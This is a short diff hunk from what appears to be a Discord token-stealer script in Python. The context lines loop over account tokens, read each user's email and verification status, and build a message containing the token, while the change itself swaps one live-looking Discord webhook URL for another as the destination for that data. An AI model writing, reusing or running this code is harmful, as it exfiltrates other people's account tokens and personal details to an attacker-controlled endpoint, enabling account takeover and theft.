@@ -153,7 +153,7 @@ for t in token:
         email = user_data.get("email", "N/A")
         email_verified = user_data.get("verified", False)
 
-        webhook_url = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
+        webhook_url = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"
         
         message = f"""
         **Token**: {t}
